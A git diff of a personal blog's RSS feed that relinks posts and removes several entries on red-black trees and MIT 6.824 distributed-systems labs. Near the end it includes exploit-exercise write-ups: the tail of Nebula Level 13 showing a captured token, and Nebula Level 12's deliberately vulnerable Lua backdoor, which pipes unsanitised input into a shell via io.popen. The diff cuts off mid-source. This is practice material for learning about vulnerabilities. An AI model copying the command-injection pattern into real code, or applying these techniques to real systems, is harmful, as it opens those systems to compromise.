-&lt;li&gt;&lt;strong&gt;Case 5:&lt;/strong&gt; P 是红色而 U 是黑色，且 N 是 P 的左子结点，则对 G 进行一次右旋操作，并把 G 标为红色，把 P 标为黑色。&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void insert_case5(struct node *n)
-{
-struct node *g = grandparent(n);
-
-n-&amp;gt;parent-&amp;gt;color = BLACK;
-g-&amp;gt;color = RED;
-if (n == n-&amp;gt;parent-&amp;gt;left)
-  rotate_right(g);
-else
-  rotate_left(g);
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h4 id=&#34;removal:668551676aee55c1093deeefc0b62506&#34;&gt;Removal&lt;/h4&gt;
-
-&lt;h3 id=&#34;left-leaning-red-black-tree-llrb:668551676aee55c1093deeefc0b62506&#34;&gt;Left-Leaning Red–Black Tree (LLRB)&lt;/h3&gt;
-</description>
-    </item>
-    
-    <item>
       <title>Linux 下 c 的扩展内联汇编</title>
-      <link>/post/2014-03-05-c-asm/</link>
+      <link>/hanjc.me/post/2014-03-05-c-asm/</link>
       <pubDate>Wed, 05 Mar 2014 19:54:09 +0800</pubDate>
       
-      <guid>/post/2014-03-05-c-asm/</guid>
+      <guid>/hanjc.me/post/2014-03-05-c-asm/</guid>
       <description>
 
 &lt;p&gt;简单总结了一下自己看到用到的一些内联汇编的知识点，并不是一个完整的总结，以后对内联汇编有了新的了解会慢慢扩充。&lt;/p&gt;
@@ -759,10 +644,10 @@ __asm__(&amp;quot;mov %edx, %eax; mov %ebx, %edx&amp;quot;)
     
     <item>
       <title>Notes on iOS Security Whitepaper</title>
-      <link>/post/2014-03-03-ios-security/</link>
+      <link>/hanjc.me/post/2014-03-03-ios-security/</link>
       <pubDate>Mon, 03 Mar 2014 19:56:09 +0800</pubDate>
       
-      <guid>/post/2014-03-03-ios-security/</guid>
+      <guid>/hanjc.me/post/2014-03-03-ios-security/</guid>
       <description>
 
 &lt;p&gt;This notes is based on &lt;em&gt;iOS Security - February 2014&lt;/em&gt;, origin link can be found &lt;a href=&#34;http://images.apple.com/iphone/business/docs/iOS_Security_Feb14.pdf&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
@@ -1076,10 +961,10 @@ on the computer where the device is backed up. The backed-up data is &lt;strong&
     
     <item>
       <title>Using theme Greyshade</title>
-      <link>/post/2014-02-27-using-theme-greyshade/</link>
+      <link>/hanjc.me/post/2014-02-27-using-theme-greyshade/</link>
       <pubDate>Thu, 27 Feb 2014 14:11:32 +0800</pubDate>
       
-      <guid>/post/2014-02-27-using-theme-greyshade/</guid>
+      <guid>/hanjc.me/post/2014-02-27-using-theme-greyshade/</guid>
       <description>
 
 &lt;p&gt;Sometimes ago I came across a blog &lt;a href=&#34;http://samwize.com/&#34;&gt;samwize&lt;/a&gt;, who uses a slightly
@@ -1125,10 +1010,10 @@ so I need to patch my modification and merge it into the Greyshade. I would do t
     
     <item>
       <title>Vim Efficiency Notes</title>
-      <link>/post/2014-02-24-vim-notes/</link>
+      <link>/hanjc.me/post/2014-02-24-vim-notes/</link>
       <pubDate>Mon, 24 Feb 2014 15:00:00 +0800</pubDate>
       
-      <guid>/post/2014-02-24-vim-notes/</guid>
+      <guid>/hanjc.me/post/2014-02-24-vim-notes/</guid>
       <description>
 
 &lt;p&gt;关于Vim的一些容易被忽视、却又能提升使用体验和操作效率的操作细节。同时记录Vim中一些（我见到过的）比较实用的配置，分享的同时也给自己留个备忘吧。
@@ -1195,88 +1080,11 @@ A 是在本行行尾插入，I 是在本行行首插入。&lt;/p&gt;
     </item>
     
     <item>
-      <title>6.824-lab3-notes</title>
-      <link>/post/2014-02-21-6-dot-824-lab3-notes/</link>
-      <pubDate>Fri, 21 Feb 2014 14:08:02 +0800</pubDate>
-      
-      <guid>/post/2014-02-21-6-dot-824-lab3-notes/</guid>
-      <description>
-
-&lt;h2 id=&#34;pre-read:6c805deaca0efd9342e0670f4a49bd04&#34;&gt;Pre-read&lt;/h2&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;http://pdos.csail.mit.edu/6.824-2013/notes/l05.txt&#34;&gt;[Lecture Notes] Fault Tolerance: Paxos&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://pdos.csail.mit.edu/6.824-2013/papers/paxos-simple.pdf&#34;&gt;[Paper] Paxos Made Simple&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;/reading/papers/paxos-simple.html&#34;&gt;My Paxos Notes&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Paxos 键值存储系统包括&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;客户端（ client ）&lt;/li&gt;
-&lt;li&gt;kvpaxos 服务器（ server ）&lt;/li&gt;
-&lt;li&gt;Paxos 节点（ peers ）&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;其中 Paxos 节点部分以类库的形式运行在服务器之上，在 lab3 的整体模型类似于 &lt;a href=&#34;http://pdos.csail.mit.edu/6.824-2013/papers/paxos-simple.pdf&#34;&gt;Paxos Made Simple&lt;/a&gt; 第三节提到的状态机，其中 proposer、acceptor 和 learner 都是 Paxos 节点，&lt;strong&gt;把整个键值存储服务看成一个状态机&lt;/strong&gt;，它会按照一定的顺序执行客户端发来的所有命令（ Put 请求），每个命令都确定性的把整个状态机向前推进一步。&lt;/p&gt;
-
-&lt;p&gt;在这里，这个状态机是由很多服务器共同构成的，这些服务器之间彼此要&lt;strong&gt;保证执行的命令的顺序完全一致&lt;/strong&gt;，为此，我们维护一个有序序列 *list*，该序列就是所有服务器应当执行命令的顺序。&lt;/p&gt;
-
-&lt;!-- more --&gt;
-
-&lt;h1 id=&#34;在服务器收到一个-put-k-v-请求之后:6c805deaca0efd9342e0670f4a49bd04&#34;&gt;在服务器收到一个 Put(k, v) 请求之后&lt;/h1&gt;
-
-&lt;ol&gt;
-&lt;li&gt;在该序列中寻找到当前最小的空位 *list[n]*，也就是新命令应该存储的位置&lt;/li&gt;
-&lt;li&gt;向 Paxos 节点 propose 在该位置上放置 &lt;em&gt;key=&amp;gt;value&lt;/em&gt; 这个命令，注意同时可能有多个服务器尝试向 &lt;em&gt;list[n]&lt;/em&gt; 这个位置放置命令，这时 Paxos 负责协调统一，决定最终放置在 &lt;em&gt;list[n]&lt;/em&gt; 处的命令应该是什么&lt;/li&gt;
-&lt;li&gt;对于单个服务器而言，如果最终 Paxos 决定放置在 &lt;em&gt;list[n]&lt;/em&gt; 处的命令与其 propose 的相同，则放置命令成功，对 Put 命令的处理结束；反之，则继续尝试在 &lt;em&gt;list[n+1]&lt;/em&gt; 处放置其 propose 的命令。&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;&lt;strong&gt;How Put(key, value) and px.Start(seq, v) meet?&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Log slot?&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;(* Paxos).Start(seq int, v interface{})&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;(* Paxos).Status(seq int) (decided bool, v interface{})&lt;/strong&gt;&lt;/p&gt;
-
-&lt;h2 id=&#34;part-b:6c805deaca0efd9342e0670f4a49bd04&#34;&gt;Part B&lt;/h2&gt;
-
-&lt;p&gt;在 Part B 中，要在 Paxos 的基础之上实现一个键值存储系统，改系统所能处理的异常情况包括：&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;TODO&lt;/li&gt;
-&lt;li&gt;TODO&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Part B 中存储系统的结构依然包括客户端、服务端，与 Lab2 中不同的是服务端彼此之间利用 Paxos 来达成共识，因此在该部分中 Paxos 是运行在存储系统服务端之下的辅助系统。下文中提到的客户端、服务端均指存储系统的客户端河服务端。&lt;/p&gt;
-
-&lt;p&gt;###基本工作原理&lt;/p&gt;
-
-&lt;p&gt;服务器本地保存一个请求队列，收到客户端的请求先缓存起来，每次服务器&lt;strong&gt;只处理队列头的请求&lt;/strong&gt;。&lt;/p&gt;
-
-&lt;p&gt;每个Put请求都要添加一段随机的身份标识，当一个客户端向多个服务器发送请求的时候请求不会被重复处理。&lt;/p&gt;
-
-&lt;p&gt;服务器维护一个列表，表示已经达成共识的消息日志（操作历史），当服务器处理一个请求的时候，尝试添加改请求到列表下一个位置，并通过 Paxos 与其他服务器达成共识。为了解决客户端重复请求的情况，服务器应当先检查本地是否包含改身份标识的操作，确认为新操作之后再进行添加请求。当该请求添加成功之后，处理缓存中下一个请求。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;如何确定消息应该添加的位置？&lt;/strong&gt;
-由于 Paxos 在收到 decide 信息的时候并不会主动通知上层，因此当请求到来的时候，服务器端保存的消息日志可能只有 n 个 slot，然而底层的 Paxos 达成共识的已经有 n+m 个了。所以服务器在处理请求队列时应当：&lt;strong&gt;1.&lt;/strong&gt; 先同 Paxos 同步信息 &lt;strong&gt;2.&lt;/strong&gt; 根据请求的身份标识判断是否是重复请求 &lt;strong&gt;3.&lt;/strong&gt; 调用 Paxos.Start &lt;strong&gt;4.&lt;/strong&gt; 轮询 Paxos.Status &lt;strong&gt;5.&lt;/strong&gt; 请求占位成功，则返回，失败则返回第1步重新执行。&lt;/p&gt;
-
-&lt;p&gt;服务器端维护的消息日志与 Paxos 节点中维护的消息列表是相对应的，内容也是一致的。不过服务端列表是完整的，而且包含了语义信息，而 Paxos 作为服务系统，并不了解列表中值的具体意义，而且 Paxos 中维护的列表内容是作为缓冲而存在的，一旦服务器同步了 Paxos 列表中的信息，就可以通过 Paxos.Done 来清空 Paxos 中缓存的信息。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Get请求直接从本地读取数据返回？&lt;/strong&gt;
-也当成一个操作，请求共识，根据最终决定的操作顺序返回相应的值。&lt;/p&gt;
-
-&lt;p&gt;一种可能的问题：客户端向服务器A发送了Put(a)=1的请求之后，又向服务器B发送Put(a)=2请求。因为Paxos请求并没有一个时间戳，所以可能出现发往B的请求先于发往A的请求达成了共识，造成&lt;strong&gt;客户端的不一致&lt;/strong&gt;&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
       <title>Notes on Paxos Made Simple</title>
-      <link>/post/2014-02-12-paxos/</link>
+      <link>/hanjc.me/post/2014-02-12-paxos/</link>
       <pubDate>Wed, 12 Feb 2014 16:21:02 +0800</pubDate>
       
-      <guid>/post/2014-02-12-paxos/</guid>
+      <guid>/hanjc.me/post/2014-02-12-paxos/</guid>
       <description>
 
 &lt;p&gt;&lt;a href=&#34;http://pdos.csail.mit.edu/6.824-2013/papers/paxos-simple.pdf&#34;&gt;Origin paper link&lt;/a&gt;&lt;/p&gt;
@@ -1515,277 +1323,11 @@ proposal it has tried to issue.&lt;/p&gt;
     </item>
     
     <item>
-      <title>6.824 Lab2 Notes</title>
-      <link>/post/2014-02-08-6-dot-824-lab2-notes/</link>
-      <pubDate>Sat, 08 Feb 2014 15:53:24 +0800</pubDate>
-      
-      <guid>/post/2014-02-08-6-dot-824-lab2-notes/</guid>
-      <description>
-
-&lt;p&gt;Lab2要实现一个分布式键-值存储服务（key/value storage service），依然使用primary/backup的架构，支持&lt;strong&gt;Put(key, value)&lt;/strong&gt;和&lt;strong&gt;Get(key)&lt;/strong&gt;两种操作，所有的键-值都存储在P的内存中，不写入硬盘，在正常运行中要保证P/B的状态一致。此外，这个lab要求实现P/B的动态分配，所以在B能正常工作之前要先与P进行状态同步，而且服务器在挂掉之后可能恢复运行，成为新的B。为了使所有人（客户端、所有的服务器）看到的状态（即P/B分别是谁）一致，lab2中引入了视图服务（viewservice）作为一个控制服务器（master server），视图服务负责监控所有键-值服务器的连接状态，在P或B挂掉之后动态的指定新的。&lt;/p&gt;
-
-&lt;!-- more --&gt;
-
-&lt;h2 id=&#34;part-a:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;Part A&lt;/h2&gt;
-
-&lt;p&gt;这一部分要实现视图服务，代码文件在/viewservice/文件夹下，命名规则与lab1相同。在partA中，Client的代码已经完整的给出了，我们需要实现的仅仅是Server部分。&lt;/p&gt;
-
-&lt;p&gt;视图服务要实现两个RPC&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;Ping(Me, Viewnum)&lt;/strong&gt; 键-值服务器通过该方法告诉视图服务：“我还活着，我所知道的当前的视图号是Viewnum”&lt;/li&gt;
-&lt;li&gt;&lt;strong&gt;Get()&lt;/strong&gt; 键-值服务器服务器或其客户端通过该方法向视图服务询问当前最新的视图&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;其中视图的定义在*common.go*文件中&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type View struct {
-	Viewnum uint
-	Primary string
-	Backup  string
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;一个&lt;strong&gt;视图（View）&lt;/strong&gt;表征了当前整个键-值存储服务的状态，它表示当前的主要服务器P是Primary，备份服务器B是Backup。每个视图还对应一个视图号（Viewnum），在视图服务初始化的时候视图号为0，以后每次视图发生变化（变更Primary或Backup）该值都会增加1。最开始的时候我以为视图服务要维护视图变更的历史，后来发现这其实是不需要的，视图服务只需要保存当前的视图就可以了。&lt;/p&gt;
-
-&lt;p&gt;视图服务要维护一个包含当前所有键-值服务器的列表，这些服务器中，一个是P，一个是B，其他的都是I（idle，空闲服务器）。所有的键-值服务器每隔100ms（由常量PingInterval定义）就要Ping一下视图服务，如果一个服务器连续5个（由常量DeadPings定义）PingInterval内都没有Ping视图服务，则视图服务&lt;strong&gt;认为该服务器挂掉&lt;/strong&gt;。为了检测距离上一次某个服务器Ping视图服务过了多久，我在视图服务中存储了每个服务器最后一次Ping的时间。&lt;/p&gt;
-
-&lt;p&gt;视图服务在当前视图被P确认之前是不会对视图进行更多的修改的，P确认当前视图的方式是发送一个包含当前视图号的Ping请求（也就是说P已经知道了当前的最新状态）。因此视图服务需要知道当前视图是否被确认了。&lt;/p&gt;
-
-&lt;p&gt;该lab还有另外一个要求，我并没有在文档中看到（也可能是我漏看了=~=），但是在最后一个测试用例中定义了，即为确认当前视图的服务器不能成为P，测试原文是“Uninitialized server can&amp;rsquo;t become primary”，刚开始不清出初始化什么意思，看了测试代码才知道是要对当前的视图进行确认。为了过这一个测试必须知道每个服务器是否初始化了，所以我在记录每个服务器最后一次Ping时间的地方，同时记录了最后一个Ping的视图号。&lt;/p&gt;
-
-&lt;p&gt;总的来讲，视图服务器端我所维护的信息如下：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type ClientInfo struct {
-	name         string    // client&#39;s name
-	last_ping    time.Time // Time of last Ping
-	last_viewnum uint      // Viewnum of last Ping
-	idle         bool      // whether this client is idle
-	dead         bool      // whether this client is dead
-}
-
-type ViewServer struct {
-	mu   sync.Mutex
-	l    net.Listener
-	dead bool
-	me   string
-
-	// Your declarations here.
-	current_view      View
-	acked             bool // current view is acked by P
-	primary_restarted bool // P has restarted within DeadPings * PingInterval
-
-	clients map[string]*ClientInfo // list of k/v servers
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;实现方面，主要需要实现的函数只有两个，Ping和tick，其中tick是一个私有方法，每隔PingInterval这么久视图服务器就会调用一次该方法。在我的实现中，我选择在Ping中修改服务器列表信息，而在tick中修改视图信息，当然，因为视图的变动而导致的服务器列表信息的变更也是在Tick中实现的。&lt;/p&gt;
-
-&lt;p&gt;以上实现的一个结论就是视图服务视图的更新并不是及时的，这点应该是符合文档的描述的，文档中给了一个例子，但是因为解释的并不是特别清楚所以我并没能一下弄明白这个例子：&lt;/p&gt;
-
-&lt;pre&gt;
-Viewnum Primary Backup     Event
---------------------------------
-0       none    none
-                           server S1 sends Ping(0), which returns view 0
-1       S1      none
-                           server S2 sends Ping(0), which returns view 1
-                             (no view change yet since S1 hasn&#39;t acked)
-                           server S1 sends Ping(1), which returns view 1 or 2
-2       S1      S2
-                           server S1 sends Ping(2), which returns view 2
-                           server S1 stops sending Pings
-3       S2      none
-                           server S2 sends Ping(3), which returns view 3
-&lt;/pre&gt;
-
-&lt;!--Viewnum | Primary | Backup | Event
-------- | ------- | ------ | ---------
-0 |none| none |
-  |    |      | server S1 sends Ping(0), which returns view 0
-1 | S1 | none |
-  |    |      | server S2 sends Ping(0), which returns view 1 (no view change yet since S1 hasn&#39;t acked)
-  |    |      | server S1 sends Ping(1), which returns view 1 or 2
-2 | S1 |  S2  |
-  |    |      | server S1 sends Ping(2), which returns view 2
-  |    |      | server S1 stops sending Pings
-3 | S2 | none |
-  |    |      | server S2 sends Ping(3), which returns view 3
---&gt;
-
-&lt;p&gt;S1向视图服务发送了Ping(0)请求之后服务器并不是立刻更新到视图1的，而是等到下一次tick执行的时候才检查当前视图能否更新，并空闲服务器列表中选出S1作为P。在tick执行之前，S1可能发送了多次Ping(0)给视图服务器，然而只有当tick执行之后，S1发送的Ping(0)请求才会返回view 1。&lt;/p&gt;
-
-&lt;p&gt;文档对这个例子的解释并不完整，比如server S1 sends Ping(0), which returns view 0之后下一次出现S1就是server S1 sends Ping(1), which returns view 1 or 2，最开始看的时候我并不是很理解为啥S1收到view 0的返回值，下次会发送Ping(1)，其实是文档中把返回view 1的那次Ping(0)给省略掉了。这也解释了为啥S1发送Ping(1)会返回view 1 or 2，其实是第一次S1 Ping(1)的时候视图服务只是确认了view 1，还没有转换到view 2，但在确认之后的下一次tick中，视图服务会从空闲服务列表中拎出来一个S2作为B，切换到view 2，这时S1再发送Ping(1)就会返回view 2。&lt;/p&gt;
-
-&lt;p&gt;而在view 2向view 3的切换过程中，S2也不是直接发送了Ping(3)，而是先发送Ping(2)，视图服务返回view 3，S2才知道自己当选了P，并向视图服务发送Ping(3)的。&lt;/p&gt;
-
-&lt;h2 id=&#34;part-b:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;Part B&lt;/h2&gt;
-
-&lt;p&gt;这一部分基本思路借鉴Lab1，不再大段总结了，大概阐述下每个函数应该做什么，然后记录下遇到的一些问题。&lt;/p&gt;
-
-&lt;h3 id=&#34;functionality:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;Functionality&lt;/h3&gt;
-
-&lt;p&gt;本部分说明各个函数的设计功能，采用函数所在位置（服务端、客户端）加函数命的方式来定位到具体的每个函数。首先客户端、服务端的变量结构如下：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type Clerk struct {
-	vs    *viewservice.Clerk  // 视图服务
-	cview viewservice.View    // 当前视图
-}
-
-type PBServer struct {
-	mu         sync.Mutex
-	l          net.Listener
-	dead       bool // for testing
-	unreliable bool // for testing
-	me         string
-	vs         *viewservice.Clerk
-
-	// Your declarations here.
-	cview  viewservice.View   // 当前视图
-	db     map[string]string  // 数据库
-	role   string             // 改服务器的角色P/B/I
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;此外我在原有的常量基础上新增了一个&lt;code&gt;ErrFwdToPrimary&lt;/code&gt;，表示发送了一个Forward请求给当前的P。&lt;/p&gt;
-
-&lt;h4 id=&#34;client-get-put:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;Client - Get/Put&lt;/h4&gt;
-
-&lt;p&gt;这两个函数实现基本结构是一样的&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;判断当前客户端看到的视图是否包含P，不包含的话更新当前视图&lt;/li&gt;
-&lt;li&gt;向服务端发送请求&lt;/li&gt;
-&lt;li&gt;1. 如果服务端没有返回或返回ErrWrongServer，更新视图再次进行步骤2
-
-&lt;ol&gt;
-&lt;li&gt;如果服务端返回成功，返回结果&lt;/li&gt;
-&lt;/ol&gt;&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h4 id=&#34;server-get:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;Server - Get&lt;/h4&gt;
-
-&lt;p&gt;本函数处理客户端发来的Get请求&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;判断自己是不是P，不是返回ErrWrongServer&lt;/li&gt;
-&lt;li&gt;根据参数中的Key读取相应的Value，如果Key存在则返回Value，否则返回ErrNoKey&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h4 id=&#34;server-put:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;Server - Put&lt;/h4&gt;
-
-&lt;p&gt;本函数处理客户端发来的Put请求&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;判断自己是不是P，不是返回ErrWrongServer&lt;/li&gt;
-&lt;li&gt;如果存在B，Forward请求至B。否则跳至步骤4&lt;/li&gt;
-&lt;li&gt;如果B返回ErrFwdToPrimary，则取消Put操作，并返回ErrWrongServer&lt;/li&gt;
-&lt;li&gt;更新本地数据库，返回OK&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h4 id=&#34;server-forward:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;Server - Forward&lt;/h4&gt;
-
-&lt;p&gt;本函数处理从P发向B的Fwd请求&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;如果自己是P，返回ErrFwdToPrimary&lt;/li&gt;
-&lt;li&gt;如果自己是I，返回ErrWrongServer&lt;/li&gt;
-&lt;li&gt;更新数据库，返回OK&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h4 id=&#34;server-sync:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;Server - Sync&lt;/h4&gt;
-
-&lt;p&gt;本函数处理P发向B的同步请求，在I成为B之后，P会先同B进行一次同步，把自己的数据库复制给B一份，然后再把接下来的Put请求Forward给B&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;更新当前视图&lt;/li&gt;
-&lt;li&gt;如果自己是P或者I，返回ErrWrongServer&lt;/li&gt;
-&lt;li&gt;用参数中的数据库覆盖本地的数据库&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;在步骤1中之所以要先更新视图，因为一种可能的情况是P拿到了最新的视图，向B发送Sync请求，但B此时尚未更新，依然认为自己是I，就直接返回ErrWrongServer了。考虑到Sync请求相比Put、Forward而言要少很多，每次Sync都更新下视图是不会成为瓶颈的。&lt;/p&gt;
-
-&lt;h4 id=&#34;server-tick:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;Server - tick&lt;/h4&gt;
-
-&lt;p&gt;本函数在服务端每隔一段时间执行一次，功能实现非常简单，调用updateView()函数。&lt;/p&gt;
-
-&lt;h4 id=&#34;server-updateview:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;Server - updateView&lt;/h4&gt;
-
-&lt;p&gt;其实完全可以把我这个函数中的内容放在tick里，不过我最初为了把更新当前视图这个功能单独拉出来所以写了这么个函数&lt;/p&gt;
-
-&lt;ol&gt;
-&lt;li&gt;从视图服务获得最新的视图&lt;/li&gt;
-&lt;li&gt;如果当前视图和最新视图一致，直接返回&lt;/li&gt;
-&lt;li&gt;更新服务器的role属性&lt;/li&gt;
-&lt;li&gt;如果我是P，而新视图中存在B，则进行一次Sync&lt;/li&gt;
-&lt;li&gt;更新当前视图&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h3 id=&#34;问题笔记:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;问题笔记&lt;/h3&gt;
-
-&lt;h4 id=&#34;什么时候需要向视图服务询问当前的视图:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;什么时候需要向视图服务询问当前的视图？&lt;/h4&gt;
-
-&lt;ol&gt;
-&lt;li&gt;每个tick需要&lt;/li&gt;
-&lt;li&gt;当P从B那里收到Err&lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;当B发现自己成了P，然而之前的P依然向他发送请求的时候，拒绝处理该请求；当P发现同步请求被B拒绝之后，知道自己已经不是P了，询问视图服务&lt;/p&gt;
-
-&lt;h4 id=&#34;b如何区分来自client的put和来自p的put:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;B如何区分来自Client的Put和来自P的Put？&lt;/h4&gt;
-
-&lt;p&gt;使用不同的接口: &lt;code&gt;Put&lt;/code&gt; &lt;code&gt;Forward&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Client是否需要添加Version信息?&lt;/p&gt;
-
-&lt;h4 id=&#34;如何同步状态:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;如何同步状态&lt;/h4&gt;
-
-&lt;pre&gt;&lt;code&gt;sync(db map[string]string)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h4 id=&#34;bug-in-viewservice:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;BUG in viewservice&lt;/h4&gt;
-
-&lt;pre&gt;
-Tick() [/var/tmp/824-1000/pb-15185-basic-1]
-
-----role:PRIMARY, view:{V:1, P:/var/tmp/824-1000/pb-15185-basic-1, B:}
-
-Tick() [/var/tmp/824-1000/pb-15185-basic-1]
-
-----role:PRIMARY, view:{V:2, P:/var/tmp/824-1000/pb-15185-basic-1, B:/var/tmp/824-1000/pb-15185-basic-1}
-&lt;/pre&gt;
-
-&lt;p&gt;viewservice会把P和B设成同一个Server&lt;/p&gt;
-
-&lt;p&gt;clients list中S1会变成idle，原因是，在tick将S1设成P，但P未ack之前，S1 time out了，所以在之后的tick中会将S1设成idle&amp;amp;dead，但是因为还没有ack，所以server不会将idle&amp;amp;dead的S1从Primary中剔除出去，而是一直等待，直到S1回复运行之后再次正常的Ping，但是此时S1已经被设置成了idle，所以会被选来做B&lt;/p&gt;
-
-&lt;p&gt;这跟我之前考虑到的一个bug类似，同样在S1被选为P，但尚未ack的时候，S1发生了一次crash，并快速恢复了，这时server会检测到一个primary_restarted，但是因为没有ack，所以不会handle，一直要等到S1 ack了之后才会handle，这时S1已经重启了，其内存数据已经丢失&lt;/p&gt;
-
-&lt;h4 id=&#34;syncargs:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;SyncArgs&lt;/h4&gt;
-
-&lt;p&gt;&lt;code&gt;map[string]string&lt;/code&gt; 是指针，不能作为RPC的参数传递。目前使用多个Forward请求来实现Sync，但这样效率极低，对性能影响较大。&lt;/p&gt;
-
-&lt;p&gt;难道是因为我map变量是小写开头的，导致没有export？ client、server因为是同一份文件，编译时没有出现错误。把SyncArgs改为&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;type SyncArgs struct {
-    DB map[string]string
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;可以通过Sync进行同步了，果然是这个原因！&lt;/p&gt;
-
-&lt;h4 id=&#34;primary-would-not-respond-get-after-crash:e1e121a52c11d4a67b50222264b50e8d&#34;&gt;Primary would not respond Get after crash&lt;/h4&gt;
-
-&lt;p&gt;在Get中直接添加对当前身份的判断（pb.role）即可通过测试，但是一个问题是在视图服务判定S1不再是P，但S1收到该视图之前，S1依然认为自己是P，这种简单判断会在这个极段的时间内出现问题&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
       <title>Exploit Exercises - Nebula Level 13</title>
-      <link>/post/2014-01-26-nebula-level13/</link>
+      <link>/hanjc.me/post/2014-01-26-nebula-level13/</link>
       <pubDate>Sun, 26 Jan 2014 21:54:12 +0800</pubDate>
       
-      <guid>/post/2014-01-26-nebula-level13/</guid>
+      <guid>/hanjc.me/post/2014-01-26-nebula-level13/</guid>
       <description>
 
 &lt;h3 id=&#34;about:d770d09b6be1c937de3594898fdf59fe&#34;&gt;About&lt;/h3&gt;
@@ -1909,6 +1451,511 @@ your token is b705702b-76a8-42b0-8844-3adabbe5ac58
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;Now &lt;em&gt;su&lt;/em&gt; to &lt;em&gt;flag13&lt;/em&gt; with the token.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Exploit Exercises - Nebula Level 12</title>
+      <link>/hanjc.me/post/2014-01-26-nebula-level12/</link>
+      <pubDate>Sun, 26 Jan 2014 20:12:53 +0800</pubDate>
+      
+      <guid>/hanjc.me/post/2014-01-26-nebula-level12/</guid>
+      <description>
+
+&lt;h3 id=&#34;about:4f2f3bde9982f1888f7baf64aff676f9&#34;&gt;About&lt;/h3&gt;
+
+&lt;p&gt;There is a backdoor process listening on port 50001.&lt;/p&gt;
+
+&lt;p&gt;To do this level, log in as the &lt;em&gt;level12&lt;/em&gt; account with the password &lt;em&gt;level12&lt;/em&gt;. Files for this level can be found in /home/flag12.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;h3 id=&#34;source-code:4f2f3bde9982f1888f7baf64aff676f9&#34;&gt;Source code&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-lua&#34;&gt;-- /home/flag12/flag12.lua 
+local socketlocal socket = require(&amp;quot;socket&amp;quot;)
+local server = assert(socket.bind(&amp;quot;127.0.0.1&amp;quot;, 50001))
+
+function hash(password) 
+  prog = io.popen(&amp;quot;echo &amp;quot;..password..&amp;quot; | sha1sum&amp;quot;, &amp;quot;r&amp;quot;)
+  data = prog:read(&amp;quot;*all&amp;quot;)
+  prog:close()
+
+  data = string.sub(data, 1, 40)
+
+  return data
+end
+
+
+while 1 do
+  local client = server:accept()
+  client:send(&amp;quot;Password: &amp;quot;)
+  client:settimeout(60)
+  local line, err = client:receive()
+  if not err then
+    print(&amp;quot;trying &amp;quot; .. line) -- log from where ;\
+    local h = hash(line)
+
+    if h ~= &amp;quot;4754a4f4bd5787accd33de887b9250a0691dd198&amp;quot; then
+      client:send(&amp;quot;Better luck next time\n&amp;quot;);
+    else
